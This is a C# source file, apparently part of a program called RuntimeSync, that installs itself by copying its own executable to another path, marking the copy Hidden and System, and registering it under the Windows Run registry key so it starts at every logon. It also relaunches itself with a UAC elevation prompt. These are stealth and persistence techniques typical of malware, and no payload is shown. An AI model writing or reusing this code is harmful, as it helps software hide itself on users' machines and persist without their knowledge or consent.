using System;
using System.Diagnostics;
using System.IO;
using Microsoft.Win32;

namespace RuntimeSync
{
    public static class Installer
    {
        public static bool IsInstalled()
        {
            var config = ConfigManager.LoadConfig();
            return config.Installed;
        }

        public static void PerformInitialSetup()
        {
            Console.WriteLine("[*] Performing first-time setup...");

            string installPath = ConfigManager.GetInstallPath();
            string currentPath = Process.GetCurrentProcess().MainModule.FileName;

            if (currentPath != installPath)
            {
                File.Copy(currentPath, installPath, true);
                File.SetAttributes(installPath, FileAttributes.Hidden | FileAttributes.System);

                AddToStartup("RuntimeSync", installPath);

                var config = ConfigManager.LoadConfig();
                config.Installed = true;
                ConfigManager.SaveConfig(config);

                // Start the copied exe (non-admin)
                Process.Start(new ProcessStartInfo
                {
                    FileName = installPath,
                    UseShellExecute = true
                });

                Environment.Exit(0); // Kill admin copy
            }
        }

        public static void RequestAdminRights()
        {
            var exeName = Process.GetCurrentProcess().MainModule.FileName;

            ProcessStartInfo startInfo = new ProcessStartInfo(exeName)
            {
                UseShellExecute = true,
                Verb = "runas" // ← triggers UAC prompt
            };

            try
            {
                Process.Start(startInfo);
            }
            catch
            {
                Console.WriteLine("[-] Admin rights denied.");
            }

            Environment.Exit(0);
        }

        private static void AddToStartup(string name, string path)
        {
            try
            {
                RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
                key.SetValue(name, path);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Failed to add to startup: " + ex.Message);
            }
        }
    }
}